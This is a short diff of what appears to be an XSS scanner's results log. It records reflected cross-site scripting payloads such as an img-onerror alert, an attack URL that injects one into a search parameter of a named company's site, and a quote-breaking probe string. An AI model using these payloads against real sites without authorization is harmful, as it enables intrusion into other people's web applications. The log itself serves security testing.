@@ -56,11 +56,6 @@ Status:
 	Detection Successful with Payload: <img src=x onerror='alert`1`'>
 Payload Detection: 
 	<q><img src=x onerror='alert`1`'></q>
-Attack URL: 
-	https://www.zentechnologies.com/search/search.php?query=<img src=x onerror='alert`1`'>&search=1
-Status:
-	* Detection UnSuccessful with Payload: <img src=x onerror="alert`1`"> * 
-
 _______________________________________________________________________________________________________
 https://www.zentechnologies.com/search/search.php?query=&search=abc/uvw"xyz'yxz<zxy
 
